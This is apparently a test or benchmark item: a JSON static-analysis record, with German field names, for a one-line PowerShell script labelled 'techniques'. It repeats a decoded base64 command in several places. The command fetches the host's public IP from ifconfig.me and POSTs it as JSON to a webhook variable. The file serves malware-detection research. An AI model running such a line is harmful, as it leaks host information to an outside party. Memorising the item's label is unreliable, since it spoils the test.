@@ -1,0 +1,63 @@
+{
+  "meta": {
+    "quelldatei": "tech_034_get-publicip.ps1",
+    "sha256": "31b4d6decdf3bd590968afc0bb18b8fce9d3395c77b24fd5acea2e3ee4503d47",
+    "groesse_bytes": 140,
+    "zeilen": 1,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 140,
+        "dekodiert": "curl ifconfig.me|%{irm $w -Met Post -Bo (@{content=$_}|ConvertTo-Json) -ContentType 'application/json'}"
+      }
+    ],
+    "base64_bloecke_gesamt": 1
+  },
+  "stufe2_features": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 140,
+        "dekodiert": "curl ifconfig.me|%{irm $w -Met Post -Bo (@{content=$_}|ConvertTo-Json) -ContentType 'application/json'}"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 140,
+        "dekodiert": "curl ifconfig.me|%{irm $w -Met Post -Bo (@{content=$_}|ConvertTo-Json) -ContentType 'application/json'}"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "Y3VybCBpZmNvbmZpZy5tZXwle2lybSAkdyAtTWV0IFBvc3QgLUJvIChAe2NvbnRlbnQ9JF99fENvbnZlcnRUby1Kc29uKSAtQ29udGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb24nfQ==",
+    "dekodierte_befehle": [
+      "curl ifconfig.me|%{irm $w -Met Post -Bo (@{content=$_}|ConvertTo-Json) -ContentType 'application/json'}"
+    ],
+    "beobachtete_abfolge": []
+  }
+}
